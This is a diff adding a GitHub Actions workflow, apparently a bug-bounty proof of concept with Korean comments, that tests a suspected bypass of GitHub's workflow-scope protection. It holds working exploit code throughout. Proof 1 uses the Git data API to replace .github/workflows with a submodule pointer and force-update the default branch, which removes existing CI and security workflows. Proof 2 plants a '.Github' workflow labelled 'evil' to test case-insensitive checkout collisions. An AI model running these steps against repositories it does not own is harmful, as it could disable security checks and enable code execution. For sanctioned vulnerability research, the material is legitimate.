@@ -1,0 +1,347 @@
+# Phase 3: Security Impact Proof
+#
+# 증명 1: Gitlink로 main branch의 기존 워크플로우 삭제
+#   → workflows scope 없이 PATCH /git/refs/heads/main
+#   → .github/workflows 디렉토리를 submodule로 교체
+#   → 기존 보안 워크플로우 전부 무력화
+#
+# 증명 2: Case-insensitive FS에서 checkout collision
+#   → .Github/workflows/ci.yml 생성 (scope 우회)
+#   → macOS/Windows runner에서 checkout 시 .github/workflows/ci.yml과 충돌
+#
+# ⚠️ 본인 소유 테스트 repo에서만 실행
+# ⚠️ 증명 1은 main branch를 수정함 → 자동 복구 포함
+
+name: "Phase 3: Impact Proof"
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  # 의도적으로 workflows scope 미포함
+
+env:
+  API: https://api.github.com/repos/${{ github.repository }}
+
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+    outputs:
+      head_sha: ${{ steps.info.outputs.head_sha }}
+      head_tree: ${{ steps.info.outputs.head_tree }}
+      default_branch: ${{ steps.info.outputs.default_branch }}
+    steps:
+      - name: Gather info
+        id: info
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          BRANCH=$(curl -s -H "Authorization: token $GH_TOKEN" "$API" | jq -r '.default_branch')
+          HEAD_SHA=$(curl -s -H "Authorization: token $GH_TOKEN" "$API/git/ref/heads/$BRANCH" | jq -r '.object.sha')
+          HEAD_TREE=$(curl -s -H "Authorization: token $GH_TOKEN" "$API/git/commits/$HEAD_SHA" | jq -r '.tree.sha')
+          echo "default_branch=$BRANCH" >> $GITHUB_OUTPUT
+          echo "head_sha=$HEAD_SHA" >> $GITHUB_OUTPUT
+          echo "head_tree=$HEAD_TREE" >> $GITHUB_OUTPUT
+          echo "Branch: $BRANCH  SHA: $HEAD_SHA  Tree: $HEAD_TREE"
+
+          # 현재 워크플로우 목록 기록 (복구 검증용)
+          echo ""
+          echo "=== Current workflows on $BRANCH ==="
+          curl -s -H "Authorization: token $GH_TOKEN" \
+            "$API/contents/.github/workflows?ref=$BRANCH" | jq '.[].name'
+
+  # ==============================================================
+  # 증명 1: Gitlink로 main branch 워크플로우 삭제
+  # ==============================================================
+  proof1-gitlink-main:
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Proof 1: Delete workflows on main via gitlink"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
+          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
+          DEFAULT_BRANCH: ${{ needs.setup.outputs.default_branch }}
+          REPO: ${{ github.repository }}
+        run: |
+          echo "╔════════════════════════════════════════════════╗"
+          echo "║  PROOF 1: Gitlink workflow deletion on main    ║"
+          echo "╚════════════════════════════════════════════════╝"
+          echo ""
+          echo "Goal: Replace .github/workflows/ with submodule pointer"
+          echo "      on DEFAULT branch ($DEFAULT_BRANCH), without workflows scope"
+          echo ""
+          echo "Original HEAD: $HEAD_SHA"
+
+          # Step 1: 현재 워크플로우 확인
+          echo ""
+          echo "=== BEFORE: Workflows on $DEFAULT_BRANCH ==="
+          BEFORE=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            "$API/contents/.github/workflows?ref=$DEFAULT_BRANCH")
+          echo "$BEFORE" | jq '.[].name' 2>/dev/null
+          BEFORE_COUNT=$(echo "$BEFORE" | jq 'length' 2>/dev/null)
+          echo "Workflow count: $BEFORE_COUNT"
+
+          if [ "$BEFORE_COUNT" = "0" ] || [ "$BEFORE_COUNT" = "null" ]; then
+            echo "⚠️ No workflows found on $DEFAULT_BRANCH, skipping"
+            exit 0
+          fi
+
+          # Step 2: Gitlink tree 생성 (.github/workflows → submodule)
+          echo ""
+          echo "=== Creating gitlink tree ==="
+          TREE_RESP=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/trees" \
+            -d "{
+              \"base_tree\": \"$HEAD_TREE\",
+              \"tree\": [{
+                \"path\": \".github/workflows\",
+                \"mode\": \"160000\",
+                \"type\": \"commit\",
+                \"sha\": \"$HEAD_SHA\"
+              }]
+            }")
+
+          GITLINK_TREE=$(echo "$TREE_RESP" | jq -r '.sha // empty')
+          echo "Gitlink tree: $GITLINK_TREE"
+
+          if [ -z "$GITLINK_TREE" ] || [ "$GITLINK_TREE" = "null" ]; then
+            echo "❌ Tree creation failed"
+            echo "$TREE_RESP" | jq '.message'
+            exit 0
+          fi
+
+          # Step 3: Commit 생성
+          echo ""
+          echo "=== Creating commit ==="
+          COMMIT_RESP=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/commits" \
+            -d "{
+              \"message\": \"security test: gitlink workflow deletion\",
+              \"tree\": \"$GITLINK_TREE\",
+              \"parents\": [\"$HEAD_SHA\"]
+            }")
+
+          GITLINK_COMMIT=$(echo "$COMMIT_RESP" | jq -r '.sha // empty')
+          echo "Gitlink commit: $GITLINK_COMMIT"
+
+          if [ -z "$GITLINK_COMMIT" ] || [ "$GITLINK_COMMIT" = "null" ]; then
+            echo "❌ Commit creation failed"
+            exit 0
+          fi
+
+          # Step 4: PATCH main branch → gitlink commit
+          echo ""
+          echo "=== CRITICAL: Patching $DEFAULT_BRANCH to gitlink commit ==="
+          PATCH_RESP=$(curl -s -o /tmp/patch.json -w "%{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X PATCH "$API/git/refs/heads/$DEFAULT_BRANCH" \
+            -d "{\"sha\":\"$GITLINK_COMMIT\",\"force\":true}")
+
+          echo "PATCH HTTP: $PATCH_RESP"
+          cat /tmp/patch.json | jq '.' 2>/dev/null | head -10
+
+          if [ "$PATCH_RESP" = "200" ]; then
+            echo ""
+            echo "::error::🔴🔴🔴 VULNERABILITY CONFIRMED!"
+            echo "Main branch updated to gitlink commit WITHOUT workflows scope!"
+
+            # Step 5: 워크플로우 삭제 확인
+            echo ""
+            echo "=== AFTER: Workflows on $DEFAULT_BRANCH ==="
+            sleep 2
+            AFTER=$(curl -s -H "Authorization: token $GH_TOKEN" \
+              "$API/contents/.github/workflows?ref=$DEFAULT_BRANCH")
+            echo "$AFTER" | jq '.' 2>/dev/null | head -20
+            AFTER_COUNT=$(echo "$AFTER" | jq 'length' 2>/dev/null || echo "ERROR")
+            echo "Workflow count after: $AFTER_COUNT (was: $BEFORE_COUNT)"
+
+            if [ "$AFTER_COUNT" != "$BEFORE_COUNT" ]; then
+              echo ""
+              echo "::error::🔴 IMPACT CONFIRMED: Workflows deleted from $DEFAULT_BRANCH!"
+              echo "  - Before: $BEFORE_COUNT workflows"
+              echo "  - After: $AFTER_COUNT workflows (or submodule pointer)"
+              echo "  - No 'workflows' scope was required"
+              echo "  - This bypasses GitHub's workflow scope enforcement"
+            fi
+
+            # Step 6: 즉시 복구
+            echo ""
+            echo "=== RESTORING $DEFAULT_BRANCH to original commit ==="
+            RESTORE_HTTP=$(curl -s -o /tmp/restore.json -w "%{http_code}" \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              -X PATCH "$API/git/refs/heads/$DEFAULT_BRANCH" \
+              -d "{\"sha\":\"$HEAD_SHA\",\"force\":true}")
+
+            echo "Restore HTTP: $RESTORE_HTTP"
+            if [ "$RESTORE_HTTP" = "200" ]; then
+              echo "✅ $DEFAULT_BRANCH restored to $HEAD_SHA"
+
+              # 복구 검증
+              sleep 2
+              RESTORED=$(curl -s -H "Authorization: token $GH_TOKEN" \
+                "$API/contents/.github/workflows?ref=$DEFAULT_BRANCH")
+              RESTORED_COUNT=$(echo "$RESTORED" | jq 'length' 2>/dev/null)
+              echo "Restored workflow count: $RESTORED_COUNT"
+            else
+              echo "⚠️ RESTORE FAILED! Manual fix needed:"
+              echo "  git push --force origin $HEAD_SHA:refs/heads/$DEFAULT_BRANCH"
+            fi
+          else
+            echo "✅ PATCH blocked (expected if GitHub checks at ref update level)"
+            echo "Response:"
+            cat /tmp/patch.json | jq '.message' 2>/dev/null
+          fi
+
+  # ==============================================================
+  # 증명 2: Case-insensitive FS checkout collision
+  # macOS runner에서 .Github/ 와 .github/ 충돌 테스트
+  # ==============================================================
+  proof2-case-collision:
+    needs: setup
+    runs-on: macos-latest
+    steps:
+      - name: "Proof 2: Case-insensitive FS collision"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
+          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
+          REPO: ${{ github.repository }}
+        run: |
+          echo "╔════════════════════════════════════════════════╗"
+          echo "║  PROOF 2: Case-insensitive FS collision        ║"
+          echo "╚════════════════════════════════════════════════╝"
+          echo ""
+          echo "macOS filesystem is case-insensitive by default"
+          echo "If .Github/workflows/evil.yml is created via scope bypass,"
+          echo "checkout could overwrite legitimate .github/workflows/ files"
+          echo ""
+
+          # Verify we're on case-insensitive FS
+          mkdir -p /tmp/case-test
+          touch /tmp/case-test/ABC
+          if [ -f /tmp/case-test/abc ]; then
+            echo "✅ Confirmed: case-insensitive filesystem"
+          else
+            echo "Case-sensitive filesystem, test may not apply"
+          fi
+          rm -rf /tmp/case-test
+
+          # Step 1: Create blob with malicious workflow
+          EVIL_WF='name: evil-overwrite\non: push\njobs:\n  pwn:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo THIS_WORKFLOW_REPLACED_THE_ORIGINAL'
+
+          BLOB=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/blobs" \
+            -d "{\"content\":\"$EVIL_WF\",\"encoding\":\"utf-8\"}" | jq -r '.sha')
+          echo "Evil blob: $BLOB"
+
+          # Step 2: Create tree with BOTH .github/ and .Github/ workflows
+          # This simulates what would happen if an attacker adds .Github/workflows/
+          # to a repo that already has .github/workflows/
+          TREE=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/trees" \
+            -d "{
+              \"base_tree\": \"$HEAD_TREE\",
+              \"tree\": [{
+                \"path\": \".Github/workflows/ci.yml\",
+                \"mode\": \"100644\",
+                \"type\": \"blob\",
+                \"sha\": \"$BLOB\"
+              }]
+            }" | jq -r '.sha')
+
+          echo "Tree with both paths: $TREE"
+
+          if [ -z "$TREE" ] || [ "$TREE" = "null" ]; then
+            echo "❌ Tree creation failed"
+            exit 0
+          fi
+
+          COMMIT=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/commits" \
+            -d "{\"message\":\"case collision test\",\"tree\":\"$TREE\",\"parents\":[\"$HEAD_SHA\"]}" | jq -r '.sha')
+
+          # Step 3: Create test branch
+          curl -s -H "Authorization: token $GH_TOKEN" \
+            -X POST "$API/git/refs" \
+            -d "{\"ref\":\"refs/heads/case-collision-test\",\"sha\":\"$COMMIT\"}" > /dev/null
+
+          # Step 4: Checkout on case-insensitive FS
+          echo ""
+          echo "=== Checking out on case-insensitive FS ==="
+          cd /tmp
+          git clone "https://x-access-token:${GH_TOKEN}@github.com/${REPO}.git" --branch case-collision-test collision-repo 2>&1 || true
+          cd collision-repo || exit 0
+
+          echo ""
+          echo "=== Directory listing ==="
+          ls -la .github/workflows/ 2>/dev/null || echo "No .github/workflows/"
+          ls -la .Github/workflows/ 2>/dev/null || echo "No .Github/workflows/"
+
+          echo ""
+          echo "=== What's actually at .github/workflows/ci.yml? ==="
+          if [ -f ".github/workflows/ci.yml" ]; then
+            echo "File exists!"
+            echo "--- Content ---"
+            cat ".github/workflows/ci.yml"
+            echo ""
+
+            # Check if this is the EVIL workflow or the original
+            if grep -q "evil-overwrite" ".github/workflows/ci.yml" 2>/dev/null; then
+              echo "::error::🔴🔴 COLLISION CONFIRMED: Evil workflow overwrote legitimate ci.yml!"
+              echo "On case-insensitive FS, .Github/workflows/ collides with .github/workflows/"
+            elif grep -q "THIS WORKFLOW REPLACED" ".github/workflows/ci.yml" 2>/dev/null; then
+              echo "::error::🔴🔴 COLLISION CONFIRMED: Attacker content present!"
+            else
+              echo "ℹ️ Original workflow preserved (Git chose .github/ over .Github/)"
+            fi
+          fi
+
+          # Step 5: Check what names are visible
+          echo ""
+          echo "=== Git status and actual tree ==="
+          git ls-tree HEAD .github/workflows/ 2>/dev/null | head -5
+          git ls-tree HEAD .Github/workflows/ 2>/dev/null | head -5
+
+          echo ""
+          echo "=== All workflow-related paths in tree ==="
+          git ls-tree -r HEAD | grep -i "workflow" | head -10
+
+          # Cleanup
+          cd /tmp
+          rm -rf collision-repo
+          curl -s -X DELETE -H "Authorization: token $GH_TOKEN" \
+            "$API/git/refs/heads/case-collision-test" 2>/dev/null
+
+  # ==============================================================
+  summary:
+    needs: [proof1-gitlink-main, proof2-case-collision]
+    if: always()
+    runs-on: ubuntu-latest
+    steps:
+      - name: Impact Summary
+        run: |
+          echo "╔════════════════════════════════════════════════════════╗"
+          echo "║  PHASE 3: SECURITY IMPACT ASSESSMENT                  ║"
+          echo "╠════════════════════════════════════════════════════════╣"
+          echo "║                                                        ║"
+          echo "║ Proof 1: Gitlink main branch overwrite                 ║"
+          echo "║   Attack: workflows scope 없이 main의 .github/workflows ║"
+          echo "║           디렉토리를 submodule로 교체                    ║"
+          echo "║   Impact: 모든 보안 워크플로우 삭제 (CI, CODEOWNERS 등)   ║"
+          echo "║   Severity: Medium-High ($4K-$20K)                     ║"
+          echo "║                                                        ║"
+          echo "║ Proof 2: Case-insensitive FS collision                 ║"
+          echo "║   Attack: .Github/workflows/ 생성 (scope 우회)          ║"
+          echo "║           macOS/Windows self-hosted runner에서 충돌      ║"
+          echo "║   Impact: 기존 워크플로우 덮어쓰기 → 코드 실행           ║"
+          echo "║   Severity: High ($10K-$20K) if collision works        ║"
+          echo "║                                                        ║"
+          echo "╚════════════════════════════════════════════════════════╝"
